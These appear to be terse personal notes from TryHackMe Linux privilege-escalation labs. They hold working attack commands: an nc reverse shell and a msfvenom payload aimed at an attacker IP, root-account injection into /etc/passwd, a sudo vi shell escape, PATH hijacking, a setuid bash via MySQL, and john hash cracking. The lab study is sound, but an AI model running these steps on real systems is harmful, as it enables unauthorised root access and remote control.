## Common Linux Privesc
	--> ssh user3@10.10.41.95 | password
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	--> common : 
		=> uname -a : 列印系統信息 
		=> cat file 
			=> /etc/crontab 執行腳本或二進位檔案
			=> /etc/passwd 發現系統上使用者
			=> /etc/shadow
			=> /etc/exports (NFS)
		=> GTFOBins
			=> sudo -l
			=> SUID 	
				=> find / -type f -perm -04000 -ls 2>/dev/null
				--> cap_setuid+ep
			=> Capabilities
				=> getcap -r / 2>/dev/null
		
		=> PATH
			=> find / -writable 2>/dev/null 
			=> export PATH=/tmp:$PATH
		=> NFS
			=> showmount -e
			=> sudo mount -o rw
		=> su 切換 user
			=> su user7

	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	--> LinEnum <--簡單的 bash 腳本
		--> https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
		=> /home/kali/2024_5_CTF/try_hack_me/task/JR/LinEnum.sh
		=> python3 -m http.server 8000
		=> wget 10.11.92.230:8000/2024_5_CTF/try_hack_me/task/JR/LinEnum.sh
		=> chmod +x LinEnum.sh
		=> ./LinEnum.sh
		
		--> uname | hostname | id |
		--> /etc/passwd | sudo | /home (ls -al) | env | Path 
		--> /etc/shells 
		--> Cron jobs: (/etc/cron | /etc/crontab)
		--> ifconfig
		--> Listening TCP/UDP
		--> PS
		--> /etc/init.d/
		--> version (Sudo / MySQL / apache /)
		--> INTERESTING FILES (nc | wget | nmap |gcc | curl)
		--> Can we read/write sensitive files
		--> SUID files
		--> capabilities
		--> NFS
		
	
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	SUID : 
		--> 讀取 (4)、寫入 (2) 和執行 (1) => 7
		--> find / -perm -u=s -type f 2>/dev/null
		--> ./SUID file
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	/etc/rasswd :
		--> x:0:0:root:/root:/bin/bash
		--> 使用者名稱:密碼(X):UID(0 root):GID(0 root):ID資訊:主目錄:shell
		
		=> openssl passwd -1 -salt new 123
			=> new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	sudo -l 
		--> GTFOBins
			=> vi : sudo vi -c ':!/bin/sh' /dev/null
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	crontab 
		--> # m h dom mon dow 使用者指令
		
		--> msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R
			=> msfvenom -p cmd/unix/reverse_netcat lhost=10.11.92.230 lport=8888 R
			
		--> 
		--> mkfifo /tmp/vqqkpvj; nc 10.11.92.230 8888 0</tmp/vqqkpvj | /bin/sh >/tmp/vqqkpvj 2>&1; rm /tmp/vqqkpvj
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	Path :
		--> #echo "[whatever command we want to run]" > [name of the executable we're imitating] # imitating--假冒
		--> cd /tmp
		--> echo "/bin/bash" >> ls
		--> chmod +x ls
		--> export PATH =/tmp:$PATH
		
		=> ./script
## Linux PrivEsc
	--> ssh user@10.10.118.228 |  password321
	--> https://tryhackme.com/r/room/linuxprivesc
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	--> select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
	
	--> /etc/shadow 檔案包含使用者密碼雜湊值
		--> john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
		--> su root + password
		--> 新的密碼雜湊 : 
	--> /etc/passwd 檔案包含有關使用者帳戶的資訊
		--> mkpasswd -m sha-512 newpasswordhere
		--> openssl passwd newpasswordhere
	--> GTFOBins ( https://gtfobins.github.io ) 
		--> sudo -l 
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
